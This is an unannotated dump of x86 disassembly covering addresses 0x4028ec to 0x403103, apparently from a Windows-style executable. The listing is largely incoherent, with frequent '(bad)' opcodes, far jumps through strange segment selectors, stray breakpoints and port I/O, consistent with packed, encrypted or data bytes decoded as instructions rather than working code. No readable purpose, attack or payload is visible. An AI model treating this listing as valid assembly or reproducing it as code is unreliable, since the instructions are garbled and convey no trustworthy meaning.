  4028ec:	or     DWORD PTR ds:0xffeb006e,0xffffff89
  4028f3:	sub    bh,bh
  4028f5:	pop    edx
  4028f6:	scas   al,BYTE PTR es:[edi]
  4028f7:	add    bh,dh
  4028f9:	or     esp,0xfffffff4
  4028fc:	jmp    FWORD PTR [ebx]
  4028fe:	and    bh,bh
  402900:	mov    dh,0xff
  402902:	jmp    DWORD PTR [eax-0x77]
  402905:	xor    ch,bl
  402907:	push   edi
  402909:	add    DWORD PTR [eax],0x3c
  40290c:	jmp    FWORD PTR [ecx+0x68]
  40290f:	add    BYTE PTR [eax],ah
  402911:	(bad)  
  402912:	call   DWORD PTR [edx+0x0]
  402915:	arpl   WORD PTR [ebx+eax*4+0x44000082],di
  40291c:	jmp    FWORD PTR [esi+0x69]
  40291f:	mov    DWORD PTR [ecx-0x7c230034],esi
  402925:	pop    es
  402926:	fwait
  402927:	jmp    FWORD PTR [ebx-0x7d]
  40292a:	jmp    DWORD PTR [edx]
  40292c:	cmp    DWORD PTR [esi],0xffffffb6
  40292f:	int3   
  402930:	mov    bl,0x89
  402932:	cmp    DWORD PTR [eax],0xffffffff
  402935:	mov    esi,0xcc15ff98
  40293a:	add    BYTE PTR [eax],al
  40293c:	call   FWORD PTR [esi]
  40293e:	rol    BYTE PTR [eax],0x58
  402941:	add    bh,bh
  402943:	inc    ecx
  402944:	jmp    FWORD PTR [ebp-0x65]
  402947:	add    BYTE PTR [esi-0xe60001],dl
  40294d:	jb     0x402905
  40294f:	add    dl,ch
  402951:	inc    DWORD PTR [eax]
  402953:	dec    ebx
  402954:	push   DWORD PTR [ecx+0x6d]
  402957:	add    edx,0x0
  40295a:	inc    esi
  40295c:	mov    DWORD PTR [edx+eiz*1-0x7cff2001],ecx
  402963:	jp     0x4028e8
  402965:	(bad)  
  402966:	ins    BYTE PTR es:[edi],dx
  402967:	sub    DWORD PTR [esi-0x7cbb0000],0xd
  40296e:	lock add ah,bh
  402971:	mov    esp,ecx
  402973:	mov    ecx,0xffa05cff
  402978:	out    0x0,al
  40297a:	inc    DWORD PTR [edi+edi*8]
  40297d:	fcmovne st,st(6)
  40297f:	add    BYTE PTR [eax+eax*1-0x34],dl
  402983:	sbb    eax,0x8340ccff
  402988:	adc    BYTE PTR [eax],al
  40298a:	dec    DWORD PTR [edi]
  40298c:	dec    edx
  40298e:	imul   eax,DWORD PTR [eax],0x48ffff67
  402994:	add    BYTE PTR [edi-0x58],dl
  402997:	(bad)  
  402998:	fld    QWORD PTR [eax]
  40299a:	add    ch,cl
  40299c:	inc    DWORD PTR [ecx-0x7ccf000b]
  4029a2:	mov    esi,edx
  4029a4:	call   FWORD PTR [edi+0x23ff8b]
  4029aa:	jmp    DWORD PTR [ecx]
  4029ac:	add    BYTE PTR [ebx-0xa],ah
  4029af:	sbb    ecx,0xffffffcc
  4029b2:	xor    ebx,0xffffffff
  4029b5:	pop    es
  4029b6:	lock jmp FWORD PTR [eax-0x1]
  4029ba:	int3   
  4029bb:	stc    
  4029bc:	or     DWORD PTR [ebx+0x45],0xffffffcc
  4029c0:	sar    edi,1
  4029c2:	inc    DWORD PTR [edx-0x7cd0c001]
  4029c8:	(bad)  
  4029c9:	(bad)  
  4029ca:	call   DWORD PTR [edi-0x7c2dda01]
  4029d0:	outs   dx,BYTE PTR ds:[esi]
  4029d1:	dec    esp
  4029d3:	cdq    
  4029d4:	add    BYTE PTR ds:0xb989b6,dh
  4029da:	call   ecx
  4029dc:	dec    esi
  4029de:	xor    bh,bh
  4029e0:	idiv   bh
  4029e2:	(bad)  
  4029e3:	fadd   QWORD PTR [ebx+0x14ff151e]
  4029e9:	(bad)  
  4029ea:	push   DWORD PTR [edi+edi*8-0x17005301]
  4029f1:	int3   
  4029f2:	add    BYTE PTR [ebp-0x7c917e01],cl
  4029f8:	leave  
  4029f9:	inc    DWORD PTR [eax]
  4029fb:	or     al,0x83
  4029fd:	inc    esi
  4029fe:	jmp    0x3f528c
  402a03:	and    al,BYTE PTR [eax]
  402a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a06:	xchg   BYTE PTR [eax],al
  402a08:	test   ah,cl
  402a0a:	push   DWORD PTR [ecx-0x27b277]
  402a10:	pop    edx
  402a11:	add    bh,bh
  402a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a14:	(bad)  
  402a15:	fsubr  DWORD PTR [esi]
  402a17:	(bad)  
  402a18:	clc    
  402a19:	(bad)  
  402a1a:	jmp    DWORD PTR [ebp-0x7d]
  402a1d:	cs inc esi
  402a1f:	add    dh,dh
  402a21:	add    bh,bh
  402a23:	jmp    0x15:0x8305a300
  402a2a:	call   DWORD PTR [ebx-0x24f300]
  402a30:	test   eax,0x836b8900
  402a35:	loopne 0x402aac
  402a37:	call   eax
  402a39:	or     DWORD PTR [ecx-0x190bff97],0xffffff89
  402a40:	popa   
  402a41:	cmp    edi,0xffffffa0
  402a44:	add    BYTE PTR [esi],dl
  402a46:	into   
  402a47:	add    BYTE PTR [eax-0x2c0001],bh
  402a4d:	jl     0x402a2a
  402a4f:	add    BYTE PTR [edx+0x3289ff],cl
  402a55:	xchg   ecx,eax
  402a56:	push   edx
  402a57:	call   DWORD PTR [edi-0x7c3f0001]
  402a5d:	iret   
  402a5e:	daa    
  402a5f:	jmp    DWORD PTR [esi+0xb900ff]
  402a65:	das    
  402a66:	lods   eax,DWORD PTR ds:[esi]
  402a67:	add    BYTE PTR [edi+0x84ff00],dl
  402a6d:	add    eax,DWORD PTR es:[ebx+0x7a89ff71]
  402a74:	add    BYTE PTR [esi-0x51],cl
  402a77:	int3   
  402a78:	add    BYTE PTR [ebx-0x19003134],0x2
  402a7f:	(bad)  
  402a80:	fdivr  st,st(7)
  402a82:	jmp    FWORD PTR [ebp+0x6f4c00]
  402a88:	sar    edi,cl
  402a8a:	add    BYTE PTR [edi+edi*8+0x28],ch
  402a8e:	dec    edi
  402a8f:	mov    DWORD PTR [edi+edi*8+0x0],eax
  402a93:	mov    ds:0x898d6900,al
  402a98:	cld    
  402a99:	add    bh,bh
  402a9b:	mov    edx,0x83812dff
  402aa0:	je     0x402aa2
  402aa2:	push   DWORD PTR [edx+0x17aeff]
  402aa8:	cdq    
  402aa9:	cmp    edi,0x16
  402aac:	add    BYTE PTR [esi-0x31],cl
  402aaf:	dec    DWORD PTR ds:0x83e3ffff
  402ab5:	js     0x402aea
  402ab7:	inc    DWORD PTR [esi-0x77]
  402aba:	int3   
  402abb:	aaa    
  402abc:	(bad)  
  402abd:	std    
  402abe:	rol    DWORD PTR [eax],0xc6
  402ac1:	mov    edi,edi
  402ac3:	int    0xff
  402ac5:	fwait
  402ac6:	aam    0x0
  402ac8:	into   
  402ac9:	add    DWORD PTR [eax],0xffffffc6
  402acc:	call   FWORD PTR [ebp-0x336b3374]
  402ad2:	dec    eax
  402ad4:	add    BYTE PTR [eax-0x8d000f],dh
  402ada:	sbb    DWORD PTR [esi-0x34],0x2b
  402ade:	mov    ebx,0x83fffbff
  402ae3:	inc    edi
  402ae4:	int3   
  402ae5:	out    dx,al
  402ae6:	int    0xff
  402ae8:	in     al,0xff
  402aea:	add    BYTE PTR ds:0x8931a100,dh
  402af0:	jmp    0x402af1
  402af2:	adc    DWORD PTR [eax-0x7d],0x14
  402af6:	scas   eax,DWORD PTR es:[edi]
  402af7:	int3   
  402af8:	xchg   edi,eax
  402af9:	add    DWORD PTR [ebx+0x4036ff72],0xffffffff
  402b00:	mov    ch,0xff
  402b02:	cmp    DWORD PTR [ecx-0x1],0x59
  402b06:	cmc    
  402b07:	add    cl,al
  402b09:	mov    edi,edi
  402b0b:	cmc    
  402b0c:	mov    DWORD PTR ds:0x83d1002a,eax
  402b12:	int3   
  402b13:	cmp    DWORD PTR [ebx-0x4e00a2b0],eax
  402b19:	mov    edi,edi
  402b1b:	add    eax,0xffaae2cc
  402b20:	add    BYTE PTR [eax],al
  402b22:	mov    DWORD PTR [esi],edx
  402b24:	dec    DWORD PTR [edx+edi*2+0x0]
  402b28:	stos   DWORD PTR es:[edi],eax
  402b29:	add    BYTE PTR [eax],al
  402b2b:	and    edi,edi
  402b2d:	shl    BYTE PTR [edi+edi*8],1
  402b30:	cmp    bh,bh
  402b32:	mov    DWORD PTR [edx-0x368101],ecx
  402b38:	xlat   BYTE PTR ds:[ebx]
  402b39:	dec    DWORD PTR [ecx-0x353bffee]
  402b3f:	add    BYTE PTR [ebx],bh
  402b41:	add    BYTE PTR [ecx-0x1dacffff],cl
  402b47:	call   DWORD PTR [edi-0x34]
  402b4a:	add    dl,cl
  402b4c:	call   FWORD PTR [eax]
  402b4e:	adc    bh,bh
  402b50:	and    bh,bh
  402b52:	add    BYTE PTR [ebx+0xa25bff],ch
  402b58:	push   edx
  402b59:	mov    edi,edi
  402b5b:	push   eax
  402b5c:	inc    DWORD PTR [esi]
  402b5e:	add    eax,0xff001f83
  402b63:	jecxz  0x402b65
  402b65:	fs add BYTE PTR cs:[edx],bl
  402b69:	(bad)  
  402b6a:	push   DWORD PTR [eax+eax*1]
  402b6d:	leave  
  402b6e:	iret   
  402b6f:	add    BYTE PTR [edx-0x7d],ch
  402b72:	jmp    FWORD PTR [ebx]
  402b74:	add    BYTE PTR [esp+esi*2],al
  402b77:	add    BYTE PTR [esi+0x7cffff],dh
  402b7d:	or     BYTE PTR [ebp-0x7c7cab34],bl
  402b83:	aaa    
  402b84:	int3   
  402b85:	sbb    cl,BYTE PTR [edx]
  402b87:	add    bh,bl
  402b89:	add    BYTE PTR [ecx-0x59bd7c3a],cl
  402b8f:	and    DWORD PTR [edx-0x3e0001],0x67
  402b96:	mov    ah,0xff
  402b98:	mov    esi,0xffc7ff83
  402b9d:	out    0x5e,al
  402b9f:	push   DWORD PTR [edx-0x1]
  402ba2:	add    bl,ah
  402ba4:	add    bl,bh
  402ba6:	leave  
  402ba7:	call   FWORD PTR [edi+edi*8+0x0]
  402bab:	imul   eax,DWORD PTR [eax],0x32
  402bae:	lods   eax,DWORD PTR ds:[esi]
  402baf:	inc    DWORD PTR [ebx+eax*4+0x0]
  402bb3:	loop   0x402bb5
  402bb5:	fdivr  QWORD PTR [ebp+0x0]
  402bb8:	clc    
  402bb9:	cmp    edi,0x67
  402bbc:	mov    esp,esi
  402bbe:	inc    DWORD PTR [eax]
  402bc0:	cli    
  402bc1:	or     DWORD PTR [ecx+0x141100d0],0xffffffcc
  402bc8:	jns    0x402bc9
  402bca:	sub    DWORD PTR ds:0x83bd1f00,0xffffffa7
  402bd1:	add    bh,bh
  402bd3:	sbb    al,0xff
  402bd5:	aas    
  402bd6:	add    BYTE PTR [eax],al
  402bd8:	repnz inc DWORD PTR [ebx-0x194f002d]
  402bdf:	int3   
  402be0:	inc    ebx
  402be1:	add    BYTE PTR [eax],al
  402be3:	cmp    bh,bh
  402be5:	xlat   BYTE PTR ds:[ebx]
  402be6:	add    eax,DWORD PTR [ebx-0x183300ef]
  402bec:	sub    DWORD PTR [edi+0x4fff73],0xffffffff
  402bf3:	cs add bl,bh
  402bf6:	inc    esi
  402bf7:	int3   
  402bf8:	sar    bh,cl
  402bfa:	mov    DWORD PTR [eax],ebp
  402bfc:	call   DWORD PTR [ecx+0x4c]
  402bff:	sbb    DWORD PTR [edi-0x1],0x0
  402c03:	pop    edi
  402c04:	call   ebx
  402c06:	dec    edi
  402c07:	inc    DWORD PTR [ebp-0x77]
  402c0a:	call   DWORD PTR [eax+0x0]
  402c0d:	hlt    
  402c0e:	jg     0x402b99
  402c10:	sub    BYTE PTR [ebx-0x4ffde01],al
  402c16:	sub    ecx,esp
  402c18:	inc    edx
  402c19:	cmp    edi,0xffffff95
  402c1c:	dec    DWORD PTR [esi+0x8689c6]
  402c22:	int3   
  402c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c24:	(bad)  
  402c25:	mov    edx,0x7fffcd
  402c2a:	call   ebp
  402c2c:	mov    DWORD PTR [esp+ecx*4],esi
  402c2f:	add    BYTE PTR [edi],bh
  402c31:	(bad)  
  402c32:	(bad)  
  402c33:	cmp    al,BYTE PTR [eax]
  402c35:	push   edi
  402c36:	in     eax,0xff
  402c38:	sbb    edi,edi
  402c3a:	add    BYTE PTR [ecx],bl
  402c3c:	add    BYTE PTR [edi-0x237c67],bh
  402c42:	int3   
  402c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c44:	call   DWORD PTR [eax-0x1e]
  402c47:	(bad)  
  402c48:	mov    ecx,0xf3ffff
  402c4d:	shl    DWORD PTR [esi-0x7c76b701],1
  402c53:	sbb    eax,0x7632ff
  402c58:	rol    BYTE PTR [eax],1
  402c5a:	xor    DWORD PTR [eax],0x0
  402c5d:	jmp    0x11ff:0x897189e2
  402c64:	mov    DWORD PTR [ebx],edi
  402c66:	call   0x8977:0xffff4a00
  402c6d:	push   esi
  402c6e:	sub    al,BYTE PTR [eax]
  402c70:	inc    ebp
  402c71:	dec    esp
  402c73:	test   DWORD PTR [ebx+0x3affd6bf],0xff80ffff
  402c7d:	in     al,dx
  402c7e:	inc    ecx
  402c7f:	(bad)  
  402c80:	jmp    0x312a:0x8919ff00
  402c87:	(bad)  
  402c88:	jle    0x402c8a
  402c8a:	add    bl,dl
  402c8c:	jmp    FWORD PTR [ebx+0xef0081]
  402c92:	jmp    DWORD PTR [edi-0xa28c00]
  402c98:	and    edi,edi
  402c9a:	add    BYTE PTR [edi],ch
  402c9c:	mov    DWORD PTR [ecx-0x5],ecx
  402c9f:	add    DWORD PTR [eax+0x0],0xffffffcc
  402ca3:	push   ss
  402ca4:	inc    DWORD PTR [ecx]
  402ca6:	popf   
  402ca7:	add    BYTE PTR [eax-0x7d],cl
  402caa:	jmp    FWORD PTR [ecx-0x7d]
  402cad:	add    eax,0x2000ad
  402cb2:	int3   
  402cb3:	jno    0x402cb5
  402cb5:	int3   
  402cb6:	push   edx
  402cb7:	add    BYTE PTR [ebx-0x1],dl
  402cba:	add    BYTE PTR [eax-0x1],ah
  402cbd:	(bad)  
  402cbe:	xlat   BYTE PTR ds:[ebx]
  402cbf:	add    BYTE PTR [esi-0x1],bl
  402cc2:	call   FWORD PTR [ebx]
  402cc4:	push   DWORD PTR [edi+0x6f]
  402cc7:	(bad)  
  402cc8:	fiadd  WORD PTR [eax]
  402cca:	mov    edi,ebx
  402ccc:	add    BYTE PTR [eax+0x69],ch
  402ccf:	dec    ebp
  402cd1:	add    BYTE PTR [eax],al
  402cd3:	stos   BYTE PTR es:[edi],al
  402cd4:	add    BYTE PTR [edx-0x18],ch
  402cd7:	xor    edx,0xffffffcc
  402cda:	mov    DWORD PTR [eax+0x0],ebx
  402cdd:	data16 cmc 
  402cdf:	add    BYTE PTR [edi+edi*8+0x0],ah
  402ce3:	aaa    
  402ce4:	cmp    DWORD PTR [ebp+0xfdffab],0xffffffff
  402ceb:	sar    bh,0x79
  402cee:	inc    edi
  402cef:	(bad)  
  402cf0:	fiadd  DWORD PTR [eax]
  402cf2:	adc    DWORD PTR [eax+eax*1],0xffffffcc
  402cf6:	scas   al,BYTE PTR es:[edi]
  402cf7:	push   esp
  402cf9:	add    BYTE PTR [eax],al
  402cfb:	test   eax,0xffd0c100
  402d00:	jo     0x402d01
  402d02:	mov    DWORD PTR [ecx-0x7d],esi
  402d05:	inc    ebp
  402d06:	cwde   
  402d07:	mov    DWORD PTR [ecx-0x7d],eax
  402d0a:	jmp    FWORD PTR [eax+0x0]
  402d0d:	and    DWORD PTR [edi+edi*8-0x500336d],edi
  402d14:	int3   
  402d15:	(bad)  
  402d16:	cmp    edi,0xf0000ae
  402d1c:	call   FWORD PTR [esi-0x960031]
  402d22:	int3   
  402d23:	inc    esp
  402d24:	add    bl,ch
  402d26:	out    dx,eax
  402d27:	call   edx
  402d29:	int3   
  402d2a:	push   DWORD PTR [edi+edi*8+0x4a00e71e]
  402d31:	add    bh,bh
  402d33:	es call ecx
  402d36:	clc    
  402d37:	add    BYTE PTR [ebp+0x98ff00],cl
  402d3d:	adc    ch,dl
  402d3f:	push   ecx
  402d41:	cmp    edi,0x46
  402d44:	(bad)  
  402d45:	stc    
  402d46:	cmp    BYTE PTR [ebx+0x4effffd6],al
  402d4c:	add    BYTE PTR [eax-0x90ff3b],al
  402d52:	add    BYTE PTR [ecx],bl
  402d54:	dec    DWORD PTR [esp+eax*1-0x7c7700]
  402d5b:	cmp    al,0x0
  402d5d:	loope  0x402dd8
  402d5f:	jmp    DWORD PTR [ebp-0x77]
  402d62:	mov    DWORD PTR [esi-0x3346cd7d],edi
  402d68:	retf   0xffff
  402d6b:	pop    eax
  402d6c:	add    BYTE PTR [ebp+0x26],cl
  402d6f:	add    DWORD PTR [ecx-0x6e0100],0xffffffad
  402d76:	(bad)  
  402d77:	call   DWORD PTR [edi-0x1]
  402d7a:	mov    DWORD PTR [esi],esi
  402d7c:	add    dh,dh
  402d7e:	sub    eax,0xff00eaff
  402d83:	scas   al,BYTE PTR es:[edi]
  402d84:	or     DWORD PTR [ebx],0x2c
  402d87:	add    BYTE PTR [ebp+0xa183ff],dl
  402d8d:	or     BYTE PTR [edi],ch
  402d8f:	call   FWORD PTR [eax-0x497601]
  402d95:	dec    edx
  402d96:	out    0xff,al
  402d98:	adc    bh,bh
  402d9a:	add    BYTE PTR [edx-0xf9fc01],bl
  402da0:	and    eax,0x8331ffcc
  402da5:	mov    dh,0x69
  402da7:	add    BYTE PTR [edi],ah
  402da9:	dec    esp
  402dab:	sub    DWORD PTR [eax],eax
  402dad:	adc    eax,0x4c00b0
  402db2:	add    BYTE PTR [esi-0x652500],cl
  402db8:	adc    ecx,esp
  402dba:	jmp    FWORD PTR [edx+0xbfebff]
  402dc0:	aas    
  402dc1:	dec    DWORD PTR [ecx-0x325fff15]
  402dc7:	add    BYTE PTR [esi-0x620001],bl
  402dcd:	inc    edi
  402dce:	mov    BYTE PTR [eax],al
  402dd0:	or     al,0x89
  402dd2:	int3   
  402dd3:	aas    
  402dd4:	int3   
  402dd5:	pop    es
  402dd6:	and    BYTE PTR [ecx-0xeff00c6],cl
  402ddc:	push   DWORD PTR [edx+0x51]
  402ddf:	call   DWORD PTR [eax+eax*1]
  402de2:	sub    eax,0xffffffcc
  402de5:	cmc    
  402de6:	loop   0x402de7
  402de8:	es (bad) 
  402dea:	jmp    DWORD PTR [edi]
  402dec:	add    BYTE PTR ds:0x9fff1,al
  402df2:	add    dh,cl
  402df4:	add    bl,cl
  402df6:	add    ah,cl
  402df8:	jb     0x402dfa
  402dfa:	jmp    esp
  402dfc:	inc    ebx
  402dfe:	adc    eax,0xcc1dff
  402e03:	popf   
  402e04:	(bad)  
  402e05:	ds xchg bh,bh
  402e08:	or     eax,0xfffccc89
  402e0d:	xchg   DWORD PTR [edi-0x1],esp
  402e10:	sub    cl,BYTE PTR [ecx+0x38836c83]
  402e16:	sar    edi,0xdd
  402e19:	inc    DWORD PTR [ebx+0x502fffd1]
  402e1f:	inc    DWORD PTR [eax+0x0]
  402e22:	push   DWORD PTR [ebx+0x0]
  402e25:	fidivr DWORD PTR [ebp-0x1]
  402e28:	cwde   
  402e29:	add    bh,bh
  402e2b:	into   
  402e2c:	inc    DWORD PTR [edi-0x6]
  402e2f:	add    BYTE PTR [ecx-0x1],al
  402e32:	add    BYTE PTR [edi+edi*8-0x4f],dl
  402e36:	jmp    0x402dc1
  402e38:	push   0xff6e00ff
  402e3d:	pop    edx
  402e3e:	push   edx
  402e3f:	add    BYTE PTR [esi],dh
  402e41:	(bad)  
  402e42:	inc    DWORD PTR [edi]
  402e44:	inc    DWORD PTR [ebp+0x7589a4]
  402e4a:	dec    DWORD PTR [edi-0x2ced7d]
  402e50:	lods   eax,DWORD PTR ds:[esi]
  402e51:	or     esp,0x5
  402e54:	(bad)  
  402e55:	mov    edx,0xe20012
  402e5a:	push   DWORD PTR [eax-0x1]
  402e5d:	push   ebp
  402e5e:	mov    ch,0xcc
  402e60:	or     bh,bh
  402e62:	dec    esi
  402e64:	call   DWORD PTR [edx-0xa800ec]
  402e6a:	add    BYTE PTR [eax-0x333aab77],al
  402e70:	mov    dl,0xff
  402e72:	add    BYTE PTR [edi+edi*8+0x6f],bl
  402e76:	ins    BYTE PTR es:[edi],dx
  402e77:	add    BYTE PTR [ecx],ah
  402e79:	(bad)  
  402e7a:	call   FWORD PTR [ebx-0x1]
  402e7d:	into   
  402e7e:	leave  
  402e7f:	push   DWORD PTR [ebx-0x7cab0077]
  402e85:	adc    DWORD PTR [edx],edi
  402e87:	add    BYTE PTR [edx],dl
  402e89:	int3   
  402e8a:	or     esp,0xffffffff
  402e8d:	pusha  
  402e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e8f:	cmp    ecx,0xffffffff
  402e92:	push   DWORD PTR [eax-0x91197d]
  402e98:	jo     0x402e9a
  402e9a:	add    BYTE PTR [eax+eax*1],bh
  402e9d:	call   DWORD PTR [ebp+0x0]
  402ea0:	xchg   edi,eax
  402ea1:	inc    DWORD PTR [eax]
  402ea3:	sbb    eax,0x83e554cc
  402ea8:	cmp    bh,0x83
  402eab:	sub    DWORD PTR [eax],eax
  402ead:	sti    
  402eae:	adc    eax,0xff83c6ff
  402eb3:	je     0x402eb4
  402eb5:	rcr    DWORD PTR [eax+eax*1],0x2
  402eb9:	(bad)  
  402eba:	(bad)  
  402ebb:	in     eax,dx
  402ebc:	add    ch,bh
  402ebe:	add    edi,edi
  402ec0:	jo     0x402ec2
  402ec2:	call   DWORD PTR [ebp-0x144a77]
  402ec8:	cs add bh,bh
  402ecb:	sar    bh,cl
  402ecd:	adc    BYTE PTR [edi+0x83afcc],ch
  402ed3:	mov    bh,0x0
  402ed5:	xchg   ecx,eax
  402ed6:	mov    edi,edi
  402ed8:	sbb    bh,bh
  402eda:	jmp    DWORD PTR [ebx+eax*4]
  402edd:	push   eax
  402ede:	sbb    BYTE PTR [ecx-0x6aff7c8f],cl
  402ee4:	add    BYTE PTR [ebx+0x5e],cl
  402ee7:	inc    DWORD PTR [edx-0x339d3400]
  402eed:	loop   0x402e74
  402eef:	(bad)  
  402ef0:	mov    edi,0x839f00ff
  402ef5:	mov    ebp,0xff81ffce
  402efa:	call   DWORD PTR [esi+0x602eff]
  402f00:	leave  
  402f01:	inc    DWORD PTR [eax]
  402f03:	or     DWORD PTR [eax],eax
  402f05:	ud2    
  402f07:	add    BYTE PTR [esi-0x1],ah
  402f0a:	add    BYTE PTR [esi-0x1],ah
  402f0d:	test   bh,bl
  402f0f:	inc    DWORD PTR [ecx]
  402f11:	mov    DWORD PTR [eax],eax
  402f13:	out    0x0,al
  402f15:	popa   
  402f16:	jp     0x402f17
  402f18:	or     bh,bh
  402f1a:	add    BYTE PTR [eax-0x77],dh
  402f1d:	pusha  
  402f1e:	adc    al,0xff
  402f20:	sub    al,0xff
  402f22:	push   DWORD PTR [esi]
  402f24:	jmp    FWORD PTR [edi+0xa800be]
  402f2a:	add    BYTE PTR [ebx+eax*4-0x18],dh
  402f2e:	inc    ebp
  402f2f:	add    bl,dl
  402f31:	(bad)  
  402f32:	inc    DWORD PTR [ebx+0xd41189]
  402f38:	rol    BYTE PTR [eax],0xff
  402f3b:	lock call FWORD PTR [edx]
  402f3e:	in     al,dx
  402f3f:	sbb    DWORD PTR [eax],0xffffffff
  402f42:	add    BYTE PTR [ebx],bl
  402f44:	add    BYTE PTR [esi-0xdbfff4],dh
  402f4a:	int3   
  402f4b:	mov    ecx,0xfffbd0ff
  402f50:	mov    esi,0xff79ff00
  402f55:	ror    esp,1
  402f57:	cmp    DWORD PTR [eax-0x7cf37d00],0xffffff90
  402f5e:	add    eax,0xffff9cff
  402f63:	call   WORD PTR [edi-0xffff8b]
  402f6a:	jmp    FWORD PTR [edi+edi*8-0x61]
  402f6e:	loopne 0x402ef3
  402f70:	lods   al,BYTE PTR ds:[esi]
  402f71:	inc    DWORD PTR [eax]
  402f73:	push   ebp
  402f74:	push   DWORD PTR [edi+0xe]
  402f77:	add    ah,bl
  402f79:	(bad)  
  402f7a:	call   FWORD PTR [esi-0x4b4b00]
  402f80:	xchg   DWORD PTR [ebx+0x5bffe300],eax
  402f86:	inc    esi
  402f87:	(bad)  
  402f88:	out    dx,al
  402f89:	inc    DWORD PTR [eax]
  402f8b:	push   0x0
  402f8d:	lods   eax,DWORD PTR ds:[esi]
  402f8e:	int3   
  402f8f:	mov    DWORD PTR [ebp-0x33c47c77],edx
  402f95:	pop    ds
  402f96:	jp     0x402f97
  402f98:	call   0xff9c2e9d
  402f9d:	xchg   BYTE PTR [edx],bh
  402f9f:	and    DWORD PTR ds:0xffda8989,0x44
  402fa6:	sbb    bh,bh
  402fa8:	pop    eax
  402fa9:	inc    DWORD PTR [ebx+0x7999834c]
  402faf:	mov    DWORD PTR [ebx+0x0],esp
  402fb2:	(bad)  
  402fb3:	mov    eax,0xff75f983
  402fb8:	adc    eax,0xff0bffff
  402fbd:	out    0x3a,eax
  402fbf:	add    BYTE PTR [ebx],ch
  402fc1:	inc    DWORD PTR [eax]
  402fc3:	dec    edx
  402fc4:	mov    DWORD PTR [ebp+ebx*8-0x1],esp
  402fc8:	add    al,0xff
  402fca:	(bad)  
  402fcb:	in     eax,dx
  402fcc:	jmp    DWORD PTR [eax-0x6bffa8]
  402fd2:	dec    DWORD PTR [eax+eax*1-0x18002ffb]
  402fd9:	(bad)  
  402fda:	call   DWORD PTR [edi-0x33c72300]
  402fe0:	das    
  402fe1:	(bad)  
  402fe2:	dec    esp
  402fe4:	add    BYTE PTR [ebx+0x7d],dh
  402fe7:	or     DWORD PTR [edx-0x77],0xffffffff
  402feb:	hlt    
  402fec:	xor    esp,0x47
  402fef:	add    BYTE PTR [edi+0x0],bl
  402ff2:	dec    DWORD PTR [ebp-0x77]
  402ff5:	dec    edx
  402ff6:	jl     0x402ff8
  402ff8:	jne    0x402ffa
  402ffa:	int3   
  402ffb:	pop    ebp
  402ffc:	(bad)  
  402ffd:	jnp    0x40301b
  402fff:	add    BYTE PTR [eax],cl
  403001:	add    bh,bh
  403003:	ret    
  403004:	inc    DWORD PTR [ecx+0x7a]
  403007:	call   DWORD PTR [eax]
  403009:	add    BYTE PTR [ebx-0x6dc533ba],al
  40300f:	(bad)  
  403010:	stc    
  403011:	cmp    edi,0x36
  403014:	mov    DWORD PTR [ecx+0x41],ebx
  403017:	add    DWORD PTR [esp+ecx*8],0xffffff83
  40301b:	mov    ebp,0xcc10bacc
  403020:	push   ecx
  403021:	(bad)  
  403022:	call   DWORD PTR [ebx]
  403024:	dec    DWORD PTR [edx-0xcaff6f]
  40302a:	add    BYTE PTR [eax+0x0],bh
  40302d:	(bad)  
  40302e:	scas   eax,DWORD PTR es:[edi]
  40302f:	jmp    esi
  403031:	add    bh,bh
  403033:	cmp    al,BYTE PTR [ebx-0xeffe81a]
  403039:	inc    DWORD PTR [eax]
  40303b:	test   eax,0xff772cff
  403040:	loope  0x403041
  403042:	dec    ebx
  403044:	dec    DWORD PTR [ebx]
  403046:	jae    0x403047
  403048:	and    al,BYTE PTR [ebx-0x64ff1501]
  40304e:	or     DWORD PTR [eax],eax
  403050:	xor    edi,edi
  403052:	int3   
  403053:	daa    
  403054:	add    BYTE PTR [esi+0xb8ff8c],dl
  40305a:	add    ch,al
  40305c:	mov    DWORD PTR [esi-0x7c893384],esp
  403062:	(bad)  
  403063:	fld    DWORD PTR [ebx-0x527c4e26]
  403069:	inc    DWORD PTR [eax]
  40306b:	dec    edx
  40306c:	add    cl,ch
  40306e:	and    bh,bh
  403070:	je     0x403071
  403072:	push   esi
  403074:	add    BYTE PTR [ebx+eax*2],cl
  403077:	adc    ebp,0xffffff83
  40307a:	(bad)  
  40307b:	jmp    0x40307d
  40307d:	lods   eax,DWORD PTR ds:[esi]
  40307e:	pop    edi
  40307f:	add    bl,cl
  403081:	inc    DWORD PTR [eax]
  403083:	clc    
  403084:	mov    ebp,edx
  403086:	fdiv   st(7),st
  403088:	dec    esp
  403089:	cmp    edi,0xffffffd4
  40308c:	jmp    ecx
  40308e:	inc    edi
  40308f:	jmp    FWORD PTR [edi-0x1]
  403092:	add    BYTE PTR [ebx-0x7c681377],cl
  403098:	mov    bh,0xff
  40309a:	int3   
  40309b:	pop    edx
  40309c:	add    BYTE PTR [ecx-0x130070],bl
  4030a2:	call   DWORD PTR [esi-0x2f2f01]
  4030a8:	(bad)  
  4030a9:	inc    DWORD PTR [eax]
  4030ab:	pop    edi
  4030ac:	jmp    DWORD PTR [ebx-0xaa0039]
  4030b2:	call   edx
  4030b4:	jmp    DWORD PTR [edi]
  4030b6:	xchg   edi,edi
  4030b8:	mov    ds:0xff00ff83,al
  4030bd:	jb     0x403139
  4030bf:	(bad)  
  4030c0:	mov    edi,0xddff00
  4030c5:	repz fdivp st(7),st
  4030c8:	mov    dh,0xff
  4030ca:	dec    DWORD PTR [ecx]
  4030cc:	dec    DWORD PTR ds:0x8335ff6c
  4030d2:	(bad)  
  4030d3:	cmp    BYTE PTR [eax],al
  4030d5:	push   esi
  4030d6:	test   DWORD PTR [eax],0x81ffccb2
  4030dc:	or     esi,0xfffffffc
  4030df:	mov    DWORD PTR [ebp-0x1],edi
  4030e2:	call   FWORD PTR [ecx+0x73fe89]
  4030e8:	push   ebx
  4030e9:	inc    DWORD PTR [eax]
  4030eb:	test   DWORD PTR [eax],eax
  4030ed:	and    DWORD PTR [ebx+eax*4-0x6],edx
  4030f1:	(bad)  
  4030f2:	dec    DWORD PTR [eax]
  4030f4:	push   DWORD PTR [ecx]
  4030f6:	nop
  4030f7:	jmp    DWORD PTR [edi]
  4030f9:	inc    DWORD PTR [eax]
  4030fb:	xor    al,0x0
  4030fd:	and    eax,DWORD PTR [ecx-0x767cf101]
  403103:	leave  
